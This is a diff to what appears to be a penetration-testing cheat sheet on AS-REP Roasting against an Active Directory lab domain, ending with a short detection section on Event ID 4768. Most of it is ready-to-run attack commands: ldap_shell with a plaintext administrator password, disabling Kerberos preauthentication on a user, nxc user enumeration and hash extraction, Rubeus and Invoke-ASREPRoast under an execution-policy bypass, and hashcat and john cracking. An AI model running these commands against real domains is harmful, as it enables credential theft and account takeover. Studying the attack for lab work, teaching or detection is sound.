@@ -68,6 +68,9 @@ ldap_shell ignite.local/administrator:Ignite@987 -dc-ip 192.168.1.48
 set_dontreqpreauth yashika true
 set_dontreqpreauth yashika false
 
+#get information about pre-authentication disable
+Get-ADUser -Filter "useraccountcontrol -band 4194304" -Properties useraccountcontrol | Format-Table name 
+
 #in valid_user.txt
 jdoe
 asmith
@@ -95,12 +98,25 @@ run
 nxc ldap 192.168.154.134 -u "/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt" -p '' -k
 nxc ldap 192.168.1.48 -u "users.txt" -p '' --asreproast output.txt
 
+Rubeus.exe asreproast /nowrap
+
+powershell -ep bypass
+Import-Module .\ASREPRoast.ps1
+Invoke-ASREPRoast
+Invoke-ASREPRoast | select -ExpandProperty Hash > hashdump
+
 
 
 hashcat -m 18200 asreproast_hashes.txt rockyou.txt
 john -w=/usr/share/wordlists/rockyou.txt hashes
 
 
+#detection 
+Event ID 4768, recorded in the Security Logs on the domain controller, is triggered whenever a Kerberos authentication ticket is requested. Key details to look for in this event include:
+
+Ticket Encryption Type: Often 0x17 (RC4 encryption).
+Pre-Authentication Type: If it is 0, it indicates that preauthentication is disabled, a condition targeted by AS-REP Roasting attacks.
+Service Name: Typically, krbtgt (Kerberos Ticket-Granting Ticket
 
 ```
 
